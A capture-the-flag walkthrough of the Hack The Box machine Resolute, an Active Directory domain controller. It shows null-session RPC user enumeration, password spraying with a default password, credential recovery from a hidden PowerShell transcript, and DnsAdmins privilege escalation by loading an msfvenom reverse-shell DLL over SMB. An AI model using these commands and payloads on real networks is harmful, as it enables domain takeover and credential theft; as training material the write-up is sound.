# Exercise: Enumeration and privilege escalation on Resolute

We introduced this machine previously when we looked at rpcclient and RIDs and SIDs. We will go through it again bearing in mind that we have covered the first step previously.

Resolute is a Windows Active Directory Domain Controller and the initial access is obtained after trying a default password that is found through enumeration of AD domain users using RPCClient. Through this discover that the password works for user Melanie and once on the box, we use winPEAS to discover a hidden directory that has been used to audit PowerShell script use. There is another password in this file for the user Ryan. Getting onto the box as Ryan, we again enumerate and discover that this user is part of the DNS Admin group. This can be exploited to load a reverse shell DLL using DNSCMD to get an elevated shell.

An nmap scan of the box reveals that it is likely an AD domain controller with DNS, Kerberos, LDAP, SMB and RPC services exposed. The domain name is megabank.local and the computer name is resolute.

```bash
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-01-07 12:36:09Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open mc-nmf .NET Message Framing
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open msrpc Microsoft Windows RPC
49665/tcp open msrpc Microsoft Windows RPC
49666/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49671/tcp open msrpc Microsoft Windows RPC
49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
49677/tcp open msrpc Microsoft Windows RPC
49683/tcp open msrpc Microsoft Windows RPC
49712/tcp open tcpwrapped
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 2h49m41s, deviation: 4h37m09s, median: 9m39s
| smb-os-discovery:
| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
| Computer name: Resolute
| NetBIOS computer name: RESOLUTE\x00
| Domain name: megabank.local
| Forest name: megabank.local
| FQDN: Resolute.megabank.local
|_ System time: 2021-01-07T04:37:05-08:00
| smb-security-mode:
| account_used: <blank>
| authentication_level: user
| challenge_response: supported
|_ message_signing: required
| smb2-security-mode:
| 2.02:
|_ Message signing enabled and required
| smb2-time:
| date: 2021-01-07T12:37:03
|_ start_date: 2021-01-07T12:31:38
```

Looking at SMB we don't find any shares exposed:

```bash
┌─[oztechmuse@parrot]─[~/boxes/Resolute]
└──╼ $crackmapexec smb resolute.htb
SMB 10.129.1.152 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 
(name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
```

Using rpcclient with null session \(user blank and no password\), we do get in:

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Resolute]
└──╼ $rpcclient -U '' -N resolute.megabank.local
rpcclient $>
Running enumdomusers, we get a list of the AD users:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
```

Taking the users and putting it into a file rids.txt and then using cut to extract just the usernames we can create a file of those:

```bash
┌─[rin@parrot]─[~/boxes/Resolute]
└──╼ $cat rids.txt | cut -d '[' -f 2 | cut -d ']' -f 1 > users.txt
```

Back to rpcclient, we can use querydispinfo to get more information about the users we found:

```bash
rpcclient $> querydispinfo
<SNIP>
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null) Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus Name: (null) Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie Name: (null) Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki Name: (null) Desc: (null)
<SNIP>
```

That gives us a password that was used when accounts were created of Welcome123! We can try this with crackmapexec to test it with all of the usernames we have already discovered:

```bash
┌─[rin@parrot]─[~/boxes/Resolute]
└──╼ $crackmapexec smb resolute.htb -u ./users.txt -p 'Welcome123!'
<SNIP>
SMB 10.129.1.152 445 RESOLUTE [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE
SMB 10.129.1.152 445 RESOLUTE [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE
SMB 10.129.1.152 445 RESOLUTE [+] megabank.local\melanie:Welcome123!
```

This gives us a login with the user melanie that we can then use evil-winrm to logon with and get the user.txt file:

```bash
┌─[rin@parrot]─[~/boxes/Resolute]
└──╼ $evil-winrm -u melanie -p 'Welcome123!' -i resolute.htb
Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents>
We can now upload winPEAS.exe using evil-winrm's built in feature of uploading files:
*Evil-WinRM* PS C:\Users\melanie\Documents> upload winPEAS.exe
Info: Uploading winPEAS.exe to C:\Users\melanie\Documents\winPEAS.exe
Data: 629416 bytes of 629416 bytes copied
Info: Upload successful!
```

When we run winPEAS, you should notice that in the PowerShell description, it mentions a directory for transcripts:

```bash
 [+] PowerShell Settings
 PowerShell v2 Version: 2.0
 PowerShell v5 Version: 5.1.14393.0
 Transcription Settings: EnableTranscripting : 0
 OutputDirectory : C:\PSTranscipts
 EnableInvocationHeader : 0
 Module Logging Settings:
 Scriptblock Logging Settings: EnableScriptBlockLogging : 0
 PS history file:
 PS history size:
```

If we change directory to c:\PSTranscripts and do a dir, we won't see anything and we have to look for hidden directories and files to be able to do that. Eventually we find a file in the path c:\PSTranscripts\20191203

```bash
*Evil-WinRM* PS C:\PSTranscripts\20191203> ls -h
 Directory: C:\PSTranscripts\20191203
Mode LastWriteTime Length Name
---- ------------- ------ ----
-arh-- 12/3/2019 6:45 AM 3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

We can download this file using the download command and look at it on our box. In the file, we notice a command that uses the user ryan with a password of Serv3r4Admin4cc123!

```bash
cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

We can then use evil-winrm to login as user ryan. In the c:\Users\ryan\Desktop directory there is a file called note.txt. After downloading it for our audit purposes, the contents reveal that any changes that are made to the system will be reverted after 1 minute. Running winPEAS again for the user ryan does not show any specific vulnerabilities apart from the fact that he is part of the DnsAdmins group. We could have also seen this by using the whoami /all command. We can get more information about this using Get-ADGroupMember:

```bash
*Evil-WinRM* PS C:\Users\ryan\Desktop> Get-AdGroupMember -Identity DnsAdmins
distinguishedName : CN=Contractors,OU=Groups,DC=megabank,DC=local
name : Contractors
objectClass : group
objectGUID : 9f2ff7be-f805-491f-aff1-3653653874d7
SamAccountName : Contractors
SID : S-1-5-21-1392959593-3013219662-3596683436-1103
*Evil-WinRM* PS C:\Users\ryan\Desktop> Get-AdGroupMember -Identity Contractors
distinguishedName : CN=Ryan Bertrand,OU=Contractors,OU=MegaBank Users,DC=megabank,DC=local
name : Ryan Bertrand
objectClass : user
objectGUID : 848c83e3-6cbe-4d3e-bacf-aa7bd37da691
SamAccountName : ryan
SID : S-1-5-21-1392959593-3013219662-3596683436-1105
```

DnsAdmins have the ability to install plugins to DNS that is running on the machine. A plugin is a library that adds functionality to DNS and it is a Dynamic Link Library \(DLL\). The easy way to do this is to create a reverse shell DLL using msfvenom, configure DNS to use it, then stop and restart the DNS server \(https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2\). The problem with this is that it will cause the DNS server to hang and become unresponsive. On Hack The Box, that is sort of ok because the system gets reset every minute, however, in a real assignment, you would not want to cause a major part of an organization's infrastructure to become inoperable. IppSec \(https://www.youtube.com/watch?v=8KJebvmd1Fk&t=2130\) shows a way of writing a custom DLL that uses threads to avoid this issue and so is a better approach but more complicated as the code is in C++ and you need the environment to build it. You can find the code for this approach on GitHub \(https://github.com/oztechmuse/Code4HackTheBox/tree/master/Machines/Resolute/revshell-dns-dll/dns-plugindll-vcpp\).

The first thing to do is create a DLL with msfvenom. For the time being, this can't be a meterpreter shell because of constraints on the DLL.

```bash
┌─[rin@parrot]─[~/boxes/Resolute]
└──╼ $msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.117 LPORT=6001 -f dll > revsh.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 5120 bytes
```

We can then start an SMB server using Impacket's smbserver.py to make the DLL accessible to the machine:

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Resolute]
└──╼ $sudo smbserver.py share $(pwd)
[sudo] password for oztechmuse:
Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
We can then stop DNS, configure it to use the plugin and then start again:
*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe stop dns
SERVICE_NAME: dns
 TYPE : 10 WIN32_OWN_PROCESS
 STATE : 3 STOP_PENDING
 (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
 WIN32_EXIT_CODE : 0 (0x0)
 SERVICE_EXIT_CODE : 0 (0x0)
 CHECKPOINT : 0x1
 WAIT_HINT : 0x7530
*Evil-WinRM* PS C:\Users\ryan\Desktop > dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.117\share\revsh.dll
Registry property serverlevelplugindll successfully reset.
Command completed successfully.
*Evil-WinRM* PS C:\Users\ryan\Desktop > sc.exe start dns
SERVICE_NAME: dns
 TYPE : 10 WIN32_OWN_PROCESS
 STATE : 2 START_PENDING
 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
 WIN32_EXIT_CODE : 0 (0x0)
 SERVICE_EXIT_CODE : 0 (0x0)
 CHECKPOINT : 0x0
 WAIT_HINT : 0x7d0
 PID : 1096
 FLAGS :
```

You will see a hit on the SMB server and then a reverse shell contacting your netcat listener:

```bash
┌─[rin@parrot]─[~/boxes/Resolute]
└──╼ $nc -lvnp 6001
listening on [any] 6001 ...
connect to [10.10.14.117] from (UNKNOWN) [10.129.1.152] 59700
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
nt authority\system
```





